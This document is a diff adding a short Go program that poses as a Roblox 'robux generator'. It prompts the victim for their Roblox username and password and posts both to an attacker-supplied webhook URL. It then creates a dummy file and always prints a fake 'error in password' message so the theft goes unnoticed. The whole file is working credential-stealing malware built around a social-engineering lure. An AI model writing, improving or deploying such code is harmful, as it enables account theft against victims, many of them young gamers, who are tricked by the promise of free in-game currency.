@@ -1,0 +1,60 @@
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+)
+
+func main() {
+	var message string
+	fmt.Print("your roblox account name (on that account will be generated robux): ")
+	fmt.Scanln(&message)
+
+	var message2 string
+	fmt.Print("your roblox account password (on that account will be generated robux): ")
+	fmt.Scanln(&message2)
+
+	webhookURL := "YOUR WEBHOOK URL HERE"
+
+	err := sendWebhookMessage(webhookURL, message, message2)
+	if err != nil {
+		fmt.Println("error in password")
+		return
+	}
+
+	fileName := "robuxgen.exe"
+	err = ioutil.WriteFile(fileName, []byte(""), 0644)
+	if err != nil {
+		fmt.Println("error in password")
+		return
+	}
+
+	newFileName := strings.TrimSuffix(fileName, ".exe") + ".png"
+	err = os.Rename(fileName, newFileName)
+	if err != nil {
+		fmt.Println("error in password")
+		return
+	}
+
+	fmt.Println("error in password")
+}
+
+func sendWebhookMessage(url string, message string, message2 string) error {
+	payload := []byte(fmt.Sprintf(`{"content":"%s %s"}`, message, message2))
+
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(payload))
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return fmt.Errorf("error in password")
+	}
+
+	return nil
+}
